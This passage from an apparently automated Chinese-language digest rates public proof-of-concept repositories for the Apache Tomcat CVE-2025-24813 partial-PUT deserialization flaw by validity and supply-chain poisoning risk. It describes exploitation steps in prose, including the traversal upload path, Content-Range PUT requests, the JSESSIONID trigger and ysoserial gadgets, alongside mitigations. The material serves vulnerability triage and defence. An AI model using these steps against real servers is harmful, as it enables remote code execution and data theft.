**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
